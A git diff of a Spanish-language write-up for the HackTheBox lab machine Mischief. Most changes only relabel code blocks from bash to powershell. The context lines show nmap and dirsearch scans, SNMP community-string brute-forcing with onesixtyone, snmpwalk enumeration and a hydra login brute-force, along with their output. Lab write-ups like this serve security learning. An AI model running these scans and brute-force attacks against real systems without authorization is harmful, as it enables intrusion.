@@ -43,7 +43,7 @@ rtt min/avg/max/mdev = 98.458/98.458/98.458/0.000 ms
 
 - [nrunscan](https://github.com/MikeRega7/nrunscan)
 
-```bash
+```powershell
 ❯ ./nrunscan.sh -i
  Give me the IP target: 10.10.10.92
 
@@ -137,14 +137,14 @@ admin:admin
 
 Si vemos las tecnologías que esta corriendo vemos las siguientes
 
-```ruby
+```powershell
 ❯ whatweb http://10.10.10.92:3366
 http://10.10.10.92:3366 [401 Unauthorized] Country[RESERVED][ZZ], HTTPServer[SimpleHTTP/0.6 Python/2.7.15rc1], IP[10.10.10.92], Python[2.7.15rc1], WWW-Authenticate[Test][Basic]
 ```
 
 Pues bueno poca cosa lo que podemos hacer es aplicar **fuzzing** para ver si hay algo pero no creo que sea buena idea ya que casi siempre en estos casos todo lo que pongas te va a redirigir al panel de login de igual forma podemos hacerlo para comprobarlo
 
-```bash
+```powershell
 ❯ dirsearch -u http://10.10.10.92:3366
 
   _|. _ _  _  _  _ _|_    v0.4.2
@@ -193,7 +193,7 @@ Nmap done: 1 IP address (1 host up) scanned in 25.38 seconds
 El escaneo lo hicimos indicándole que queremos que nos escanee los **500** puertos mas comunes y solo vemos un puerto abierto que es el del servicio **snmp** que ya lo hemos visto en otras maquinas así que ahora haremos un escaneo para ver mas información del servicio.
 <https://book.hacktricks.xyz/network-services-pentesting/pentesting-snmp/snmp-rce>
 
-```bash
+```powershell
 ❯ nmap -sCV -p161 -sU 10.10.10.92 -oN targeted2
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 13:33 CST
 Nmap scan report for 10.10.10.92
@@ -850,19 +850,14 @@ Service Info: Host: Mischief
 
 Bueno en este servicio para poder enumerarlo necesitamos contar con una **comunity string** existe una herramienta para poder hacer **fuerza bruta** y saber cual es ademas en el propio **seclists** hay un **.txt** que nos facilita todo esto 
 
-```bash
-❯ locate /Discovery/SNMP/common-snmp-community-strings.txt
-/usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
-```
-
-```bash
+```powershell
 ❯ locate /Discovery/SNMP/common-snmp-community-strings.txt
 /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
 ```
 
 Y bueno ya sabemos que la **comunity string** es **public** así que ahora podemos seguir enumerando el servicio
 
-```bash
+```powershell
 ❯ onesixtyone 10.10.10.92 -c /usr/share/seclists/Discovery/SNMP/common-snmp-community-strings.txt
 Scanning 1 hosts, 121 communities
 10.10.10.92 [public] Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
@@ -871,7 +866,7 @@ Scanning 1 hosts, 121 communities
 
 Podemos usar la herramienta **snmpwalk** para enumerar esto pero de primeras nos esta mostrando mucha data 
 
-```bash
+```powershell
 ❯ snmpwalk -v2c -c public 10.10.10.92
 SNMPv2-MIB::sysDescr.0 = STRING: Linux Mischief 4.15.0-20-generic #21-Ubuntu SMP Tue Apr 24 06:16:15 UTC 2018 x86_64
 SNMPv2-MIB::sysObjectID.0 = OID: NET-SNMP-MIB::netSnmpAgentOIDs.10
@@ -912,7 +907,7 @@ SNMPv2-MIB::sysORUpTime.6 = Timeticks: (22) 0:00:00.22
 
 Lo que podemos hacer es decirle mediante otro parámetro que nos muestre el tipo de **IP** ya que asta ahora todo va por **ipv4**
 
-```bash
+```powershell
 ❯ snmpwalk -v2c -c public 10.10.10.92 ipAddressType
 IP-MIB::ipAddressType.ipv4."10.10.10.92" = INTEGER: unicast(1)
 IP-MIB::ipAddressType.ipv4."10.10.10.255" = INTEGER: broadcast(3)
@@ -944,7 +939,7 @@ Bueno también podemos hacer un escaneo de **Nmap** pero básicamente para este 
 
 Ahora vemos el puerto **80** abierto 
 
-```bash
+```powershell
 ❯ nmap -p- --open -sS --min-rate 5000 -vvv -n -Pn -6 dead:beef::250:56ff:feb9:5fae -oG allPorts2
 Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
 Starting Nmap 7.93 ( https://nmap.org ) at 2023-06-27 13:56 CST
@@ -1069,7 +1064,7 @@ Si probamos con **liko** y las 2 contraseñas ninguna funciona al igual que cuan
 
 Podemos usar **hydra** para ver si alguna credencial es valida con usuarios de algún **.txt** de **seclists** y en otro archivo podemos poner las contraseñas que tenemos para ver si funciona 
 
-```bash
+```powershell
 ❯ hydra mischief.htb -L /usr/share/seclists/Usernames/top-usernames-shortlist.txt -P passwords.txt http-form-post "/login.php:user=^USER^&password=^PASS^:Sorry, those credentials do not match"
 Hydra v9.1 (c) 2020 by van Hauser/THC & David Maciejak - Please do not use in military or secret service organizations, or for illegal purposes (this is non-binding, these *** ignore laws and ethics anyway).
 
